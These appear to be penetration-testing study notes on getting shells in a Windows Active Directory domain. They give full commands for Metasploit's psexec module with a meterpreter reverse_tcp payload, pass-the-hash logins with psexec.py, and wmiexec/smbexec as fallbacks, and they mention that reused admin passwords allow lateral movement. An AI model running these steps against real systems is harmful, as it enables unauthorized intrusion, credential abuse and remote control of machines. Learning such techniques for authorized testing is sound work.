## Gaining Shell Access
- Don't need a shell to compromise a domain
- Shells are helpful to dig for information
### Methods
- Metasploit: `exploit/windows/smb/psexec` with a password or hash, can be noisy
- psexec: `psexec.py domain/user:'password'@ip` or `psexec.py user@ip -hashes LM:NT`, less noisy

### Metasploit
- Load up msfconsole
- `search psexec` or `use exploit/windows/smb/psexec`
- `set payload windows/x64/meterpreter/reverse_tcp`
- `set rhost <target>`
- `set smbdomain <domain>`
- `set smbuser <user>`
- `set smbpass <pass>`
- `run`
- `background`, then `sessions #` to return to it
- `set smbuser Administrator`
- `unset smbdomain`
- `set smbpass <admin NT:LM>`
- `run`
- This is password reusage, same admin password on both machines

  ![image](https://github.com/user-attachments/assets/daad8166-3c37-4b1a-90ee-5fa9d0690bc4)

### psexec
- `psexec.py <domain>/<user>:<'password'>@<ip>`

  ![image](https://github.com/user-attachments/assets/647a4452-f2f9-4775-b2b0-3b2a309a9d32)

- `psexec.py Administrator@10.0.2.5 -hashes <admin NT:LM>

  ![image](https://github.com/user-attachments/assets/cd28702d-c8a3-48c5-8fb9-bac9d91df083)

### Other Options
- If psexec is getting blocked, try `wmiexec.py` or `smbexec.py`

![image](https://github.com/user-attachments/assets/4238ceac-3aba-4501-a1df-b1e1ae8f91dc)
